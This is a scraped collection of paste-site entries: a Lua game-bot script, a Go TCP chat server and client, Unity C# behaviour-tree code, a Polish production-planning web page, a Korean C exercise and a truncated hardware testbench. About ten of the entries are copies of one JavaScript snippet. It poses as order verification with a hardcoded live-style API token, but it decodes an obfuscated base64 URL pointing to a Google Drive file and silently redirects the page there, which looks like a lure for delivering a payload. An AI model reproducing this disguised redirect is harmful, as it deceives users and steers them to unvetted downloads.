
function get_item_count(itemId)
    local count = 0
    for _, container in pairs(g_game.getContainers()) do
        for _, item in ipairs(container:getItems()) do
            if item:getId() == itemId then
                count = count + item:getCount()
            end
        end
    end
    for _, item in ipairs(player:getItems()) do
        if item:getId() == itemId then
            count = count + item:getCount()
        end
    end
    return count
end

function check_purse()
    local purse = getContainerByName(""Store inbox"")
    if not purse then
        g_game.use(g_game.getLocalPlayer():getInventoryItem(InventorySlotPurse))
    end
end

function talk_hireling()
    check_purse()
    CaveBot.Conversation(""hi"")
    schedule(200, function()
        check_purse()
        CaveBot.Conversation(""food"")
    end)
    schedule(400, function()
        check_purse()
        CaveBot.Conversation(""specific"")
    end)
    schedule(800, function()
        check_purse()
        CaveBot.Conversation(hireling_settings.dish_name)
    end)
    schedule(1200, function()
        check_purse()
        CaveBot.Conversation(""yes"")
    end)
    
    schedule(1600, function()
        if get_item_count(hireling_settings.dish_id) < hireling_settings.dish_amount then
            check_and_buy()
        end
    end)
end

function buy_hireling()
    local hireling = getCreatureByName(hireling_settings.hireling_name)
    if not hireling then
        print(""CaveBot[follow]: can't find hireling to follow"")
        return
    end

    local hireling_pos = hireling:getPosition()
    local pos = pos()

    if getDistanceBetween(hireling_pos, pos) > 2 then
        follow(hireling)
        schedule(1000, buy_hireling)
        return
    end

    g_game.cancelFollow()
    talk_hireling()
end

function check_and_buy()
    check_purse()

    if get_item_count(hireling_settings.dish_id) < hireling_settings.dish_amount then
        buy_hireling()
    end
end

check_and_buy()
return true"
YqtCV4rW,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:18:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/717/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
farArjbe,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 10:06:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sgBB7wyd,tcp server/client,arekkusu6,Go,Tuesday 25th of March 2025 10:03:32 AM CDT,"//server
package main

import (
	""encoding/json""
	""fmt""
	""log""
	""net""
	""sync""
)


type Datas struct {
	ID		string		`json:""id""`
	Text	string		`json:""text""`
}


var (
	clients = make(map[net.Conn]string)
	mu sync.Mutex
)


func handleConnection(conn net.Conn, id string) {
    defer func()  {
		conn.Close()
		mu.Lock()
		delete(clients, conn)
		mu.Unlock()
	}()


    for {
		var dec = json.NewDecoder(conn)

		var datas Datas

		if err := dec.Decode(&datas); err != nil {
			return
		}

		fmt.Println(datas)

		mu.Lock()
        for client, roomID := range clients {
			if roomID == id && client != conn {
				if err := json.NewEncoder(client).Encode(&datas); err != nil {
					log.Println(err)
					return
				}
			}
		}
		mu.Unlock()
    }
}


func startServer() {
	addr, err := net.ResolveTCPAddr(""tcp"", "":8000"")

    if err != nil {
        log.Println(err)
		return
    }

    ln, err := net.ListenTCP(""tcp"", addr)

    if err != nil {
        log.Println(err)
		return
    }

    defer ln.Close()

    for {
        conn, err := ln.Accept()

        if err != nil {
            log.Println(err)
			return
        }

		var idB = make([]byte, 1024)

		n, err := conn.Read(idB)

		if err != nil {
			log.Println(err)
			return
		}

		var id = string(idB[:n])

		mu.Lock()
		clients[conn] = id
		mu.Unlock()

		fmt.Println(clients)

	    go handleConnection(conn, id)
	}
}

//client
package main

import (
	""encoding/json""
	""fmt""
	""log""
	""net""
)


func read(conn net.Conn) {
	for {
		var received Datas

		var dec = json.NewDecoder(conn)

		if err := dec.Decode(&received); err != nil {
			log.Println(err)
			return
		}

		fmt.Println(received.Text)
	}
}


func write(conn net.Conn, id string, username string) {
	for {
		var text string

		if _, err := fmt.Scanln(&text); err != nil {
			log.Println(err)
			return
		}
	
		var datas = Datas{
			ID: id,
			Text: fmt.Sprintf(""%s said %q"", username, text),
		}
	
		var enc = json.NewEncoder(conn)
	
		if err := enc.Encode(&datas); err != nil {
			log.Println(err)
			return
		}
	}
}


func startClient(id string, username string) {
	conn, err := net.Dial(""tcp"", ""localhost:8000"")

	if err != nil {
		log.Println(err)
		return
	}

	if _, err := conn.Write([]byte(id)); err != nil {
		log.Println(err)
		return
	}

	go read(conn)
	go write(conn, id, username)

	select {}
}"
uzFXfvLx,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:54:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/598/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8C281fLx,Untitled,crescentfresh,C#,Tuesday 25th of March 2025 09:54:05 AM CDT,"public class NodeCanvasCustomBT : MonoBehaviour
    {
        private NodeCanvas.BehaviourTrees.BehaviourTree _bt;
        private NodeCanvas.Framework.Blackboard _blackboard;
        private BehaviourTreeOwner _behaviourTreeOwner;
        private Action _btFinished;
        [SerializeField] private bool debug;
      
        public bool IsRunning { get; private set; }

        public void SetBehaviourTree(NodeCanvas.BehaviourTrees.BehaviourTree bt)
        {
            _bt = bt;
            _behaviourTreeOwner.repeat = false;
            _behaviourTreeOwner.enabled = false;
        }
        
        public void StartBehaviourTree(Action btFinished)
        {
            _btFinished = btFinished;
            //_behaviourTreeOwner.blackboard = _blackboard;
            _behaviourTreeOwner.StartBehaviour(_bt, Callback);
            _behaviourTreeOwner.enabled = true;
            IsRunning = true;
        }

        private void Callback(bool obj)
        {
            if (debug) Debug.Log($""BT Finished {obj}"");
            IsRunning = false;
            _btFinished?.Invoke();
        }

        private void Awake()
        {
            _behaviourTreeOwner = GetComponent<BehaviourTreeOwner>();
            _blackboard = GetComponent<NodeCanvas.Framework.Blackboard>();
        }

        public void SetVariable(string variable, object value)
        {
            _blackboard.SetVariableValue(variable, value);
        }
        
    }"
uYN1hGYG,Untitled,crescentfresh,C#,Tuesday 25th of March 2025 09:52:28 AM CDT,"public class NodeCanvasCustomBT : MonoBehaviour
    {
        private NodeCanvas.BehaviourTrees.BehaviourTree _bt;
        private NodeCanvas.Framework.Blackboard _blackboard;
        private BehaviourTreeOwner _behaviourTreeOwner;
        private Action _btFinished;
        [SerializeField] private bool debug;
      
        public bool IsRunning { get; private set; }

        public void SetBehaviourTree(NodeCanvas.BehaviourTrees.BehaviourTree bt)
        {
            _bt = bt;
            _behaviourTreeOwner.repeat = false;
            _behaviourTreeOwner.enabled = false;
        }
        
        public void StartBehaviourTree(Action btFinished)
        {
            _btFinished = btFinished;
            //_behaviourTreeOwner.blackboard = _blackboard;
            _behaviourTreeOwner.StartBehaviour(_bt, Callback);
            _behaviourTreeOwner.enabled = true;
            IsRunning = true;
        }

        private void Callback(bool obj)
        {
            if (debug) Debug.Log($""BT Finished {obj}"");
            IsRunning = false;
            _btFinished?.Invoke();
        }

        private void Start()
        {
            _blackboard.SetVariableValue(""_transform"", gameObject);
        }

        private void Awake()
        {
            _behaviourTreeOwner = GetComponent<BehaviourTreeOwner>();
            _blackboard = GetComponent<NodeCanvas.Framework.Blackboard>();
        }

        public void SetVariable(string variable, object value)
        {
            _blackboard.SetVariableValue(variable, value);
        }
        
    }"
m2TVfGas,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:42:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/709/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8fNWarF4,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:29:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/230/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
6y1RLZh7,alg,black_duck11,HTML,Tuesday 25th of March 2025 09:22:07 AM CDT,"

<!DOCTYPE html>
<html lang=""pl"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>PROJEKT</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid black;
            padding: 8px;
            text-align: center;
        }
        input {
            width: 50px;
            text-align: center;
        }
    </style>
</head>
<body>

<h2>Algorytm GHP</h2>
<p>Na stanie: <input type=""number"" id=""naStanie"" value=""20"" min=""0"" oninput=""calculateGRP()""></p>
<p>Czas realizacji: <input type=""number"" id=""czasRealizacji"" value=""1"" min=""1"" oninput=""calculateGRP()""></p>

<table id=""ghpTable"">
    <thead>
        <tr>
            <th>Kategoria</th>
            <th>Tydzień 1</th>
            <th>Tydzień 2</th>
            <th>Tydzień 3</th>
            <th>Tydzień 4</th>
            <th>Tydzień 5</th>
            <th>Tydzień 6</th>
            <th>Tydzień 7</th>
            <th>Tydzień 8</th>
            <th>Tydzień 9</th>
            <th>Tydzień 10</th>
        </tr>
    </thead>
    <tbody>
        <tr id=""popyt"">
            <td>Przewidywany popyt</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""20"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""produkcja"">
            <td>Produkcja</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""28"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""30"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""dostepne"">
            <td>Dostępne</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
            <td>0</td>
        </tr>
    </tbody>
</table>

<table id=""mrpTable"">
    <h2>ALgorytm MRP</h2>
    <p>BOM 1</p>
    <p>Na stanie: <input type=""number"" id=""naStanieMRP"" value=""40"" min=""0"" oninput=""calculateMRP()""></p>
    <p>Czas realizacji: <input type=""number"" id=""czasRealizacjiMRP"" value=""2"" min=""1"" oninput=""calculateMRP()""></p>


    <thead>
        <tr>
            <th>Dane produkcyjne</th>
            <th>Tydzień 1</th>
            <th>Tydzień 2</th>
            <th>Tydzień 3</th>
            <th>Tydzień 4</th>
            <th>Tydzień 5</th>
            <th>Tydzień 6</th>
            
        </tr>
    </thead>
    <tbody>
        <tr id=""zapotrzebownie"">
            <td>Całkowite zapotrzebowanie</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
         
        </tr>
        <tr id=""przyjecia"">
            <td>Planowane przyjęcia</td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
            <td><input type=""number"" value=""0"" min=1></td>
        </tr>
        <tr id=""na_stanie"">
            <td>Przewidywane na stanie</td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
            <td><input type=""number"" value=""40"" disabled></td>
        </tr>
        <tr id=""zap_netto"">
            <td>Zapotrzebowanie netto</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""zamowienia"">
            <td>Planowane zamówienia</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
        <tr id=""przyjecia_zamowien"">
            <td>Planowane przyjęcie zamówień</td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
            <td><input type=""number"" value=""0"" disabled></td>
        </tr>
            
       
    </tbody>
</table>

<button onclick=""calculateGRP()"">Przelicz</button>

<script>
    let tygodnie = 10;
    let poczatkowyStan = 20;
    let popyt = [0, 0, 0, 0, 20, 0, 40, 0, 0, 0];
    let produkcja = [0, 0, 0, 0, 28, 0, 30, 0, 0, 0];
    let czasRealizacji = 1;

    function createTable() {
        let popytRow = document.getElementById(""popyt"");
        let produkcjaRow = document.getElementById(""produkcja"");
        let dostepneRow = document.getElementById(""dostepne"");

        // Usuwamy kolumny po 10 tygodniu
        let cells = popytRow.querySelectorAll('td');
        cells.forEach((cell, index) => {
            if (index > tygodnie) {
                cell.remove();
            }
        });
        
        cells = produkcjaRow.querySelectorAll('td');
        cells.forEach((cell, index) => {
            if (index > tygodnie) {
                cell.remove();
            }
        });

        cells = dostepneRow.querySelectorAll('td');
        cells.forEach((cell, index) => {
            if (index > tygodnie) {
                cell.remove();
            }
        });

        calculateGRP();
    }
    

    function calculateGRP() {
    let popytCells = document.querySelectorAll(""#popyt td input"");
    let produkcjaCells = document.querySelectorAll(""#produkcja td input"");
    let dostepneCells = document.querySelectorAll(""#dostepne td"");
    let zapotrzebowanieCells = document.querySelectorAll(""#zapotrzebownie td input"");
    let czasRealizacji = parseInt(document.getElementById(""czasRealizacji"").value) || 1;

    let dostepne = parseInt(document.getElementById(""naStanie"").value) || poczatkowyStan;
    
    // Obliczamy dostępność w tabeli GHP
    for (let i = 0; i < tygodnie; i++) {
        let popytT = parseInt(popytCells[i].value) || 0;
        let produkcjaT = parseInt(produkcjaCells[i].value) || 0;

        dostepne = dostepne - popytT + produkcjaT;
        dostepneCells[i+1].innerText = dostepne;
    }

    for (let i = 0; i < tygodnie - czasRealizacji; i++) {
        let produkcjaT = parseInt(produkcjaCells[i +czasRealizacji].value) || 0;
        if (zapotrzebowanieCells[i]) {
            zapotrzebowanieCells[i].value = produkcjaT;
}
      
         }
    }
    function calculateMRP() {
    let przewid_na_stanie = parseInt(document.getElementById(""naStanieMRP"").value) || 0;

    let cells = document.querySelectorAll(""#na_stanie td input"");

    // pole przewidywane na stanie usupełniane zgodnie z wartością z input
    for (let i = 0; i < cells.length; i++) {
        if (cells[i]) {
            cells[i].value = przewid_na_stanie;
        }
    }



}
function compareZapotrzebowanie() {
    // Odczytanie wartości z komórek
    let zapotrzebowanieCells = document.querySelectorAll(""#zapotrzebownie td input"");
    let naStanieCells = document.querySelectorAll(""#na_stanie td input"");

    // Przechodzimy po komórkach i porównujemy wartości
    for (let i = 0; i < zapotrzebowanieCells.length; i++) {
        let zapotrzebowanieValue = parseInt(zapotrzebowanieCells[i].value) || 0;
        let naStanieValue = parseInt(naStanieCells[i].value) || 0;

        // Porównanie wartości
        if (zapotrzebowanieValue > naStanieValue) {
            // Zrobimy coś, jeśli zapotrzebowanie jest większe niż stan
            console.log(""Zapotrzebowanie jest większe niż stan w tygodniu "" + (i + 1));
        } else if (zapotrzebowanieValue < naStanieValue) {
            // Zrobimy coś, jeśli zapotrzebowanie jest mniejsze niż stan
            console.log(""Stan jest większy niż zapotrzebowanie w tygodniu "" + (i + 1));
        } else {
            // Zrobimy coś, jeśli zapotrzebowanie i stan są równe
            console.log(""Zapotrzebowanie i stan są równe w tygodniu "" + (i + 1));
        }
    }
}




    document.getElementById(""czasRealizacji"").addEventListener('input', calculateGRP);
    document.getElementById(""naStanie"").addEventListener('input', calculateGRP);
    document.getElementById(""naStanieMRP"").addEventListener('input',calculateMRP)
    document.getElementById(""naStanieMRP"").addEventListener('input', compareZapotrzebowanie);

    
    createTable();
</script>

</body>
</html>"
9KPVcpyS,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:17:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/042/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FjX1Kf6t,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 09:05:52 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/906/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gHxUiPfE,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:53:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/881/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
vwTpB0j1,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:41:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/148/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BvqSycBS,fixed errors,midnight_sun,C,Tuesday 25th of March 2025 08:40:23 AM CDT,"#include<stdio.h>
int main() {
	/*
	int age = a;
	float height = h, weight = w;

	정수(int)를 담을 수 있는 'age'라는 변수(상자)에 a를 집어 넣는다 -> a가 뭔데?
	실수(float)를 담을 수 있는 'height'라는 변수(상자)에 h를 집어 넣는다 -> h가 뭔데?
	실수(float)를 담을 수 있는 'weight'라는 변수(상자)에 w를 집어 넣는다 -> w가 뭔데?

	*/
	int age;
	float height, weight;

	printf(""Enter your age : "");

	//scanf(""%d"", &a); 함수 이름이 age 이므로 &age
	scanf(""%d"", &age);

	printf(""Enter your height in cm : "");

	//scanf(""%f"", &h); 함수 이름이 height이므로 &height
	scanf(""%f"", &height);

	printf(""Enter your weight in kg : "");

	//scanf(""%d"", %w);
	/*
	* 1. 함수 이름이 weight이므로 &weight
	* 2. %가 아닌 &
	* 3. 실수를 입력 받으므로 %f
	*/

	scanf(""%f"", &weight);

	//printf(66+(13.8*weight)+)5.0*height-6.8*age);
	/*
	* 1. 실수를 출력할 예정이고, 소수점 둘째 자리까지만 출력해야 하므로 %0.2f를 추가해야함
	* 2. ~~)5.0 -> 괄호 두번
	*/

	printf(""%0.2f"", 66 + 13.8 * weight + 5.0 * height - 6.8 * age);
	return 0;
}"
e2C1S6wE,Untitled,jm33,JavaScript,Tuesday 25th of March 2025 08:28:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/553/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
X8wxbfpG,Untitled,crying234324,VHDL,Tuesday 25th of March 2025 08:26:47 AM CDT,"// tutorial1_tb
//
// Uriel Martinez-Hernandez
// Updated 2022

`timescale 1ns / 1ps
// The line above determines that the # delay
// command uses 1ns steps and that the shortest
// delay considered is 1 ps.

// The testbench has no inputs or outputs. That
// would be like having wires hanging randomly
// off the side of your desk. Don't do that: you
// you might trip over them!
module tutorial1_tb();

      // The module under test has 4 inputs and 1
      // output. By using the same name in the
      // testbench we are able to make use of .*
      // in the instantiation of the module.
      logic A,B,C,D,Z;

      // Change the name on the line below to match
      // the module name you used. uut stands for
      // ""unit under test"". It's convention but not
      // required you could call it Susan if you
      // really wanted to.
      tutorial1 uut (.*);

      // The initial block describes what happens to
      // our module inputs during the test.
      initial
      begin
      
            // By starting with a short wait, we can
            // observe that the inputs start at neither
            // 1 nor 0.
            #10;
            
            // Now we clear all the inputs to zero.
            A = '0;
            B = '0;
            C = '0;
            D = '0;
            
            // Finally we set each input to one over a
            // period of 40 ns.
            #10 A = 1;        
                   B = 0;
                C = 0;
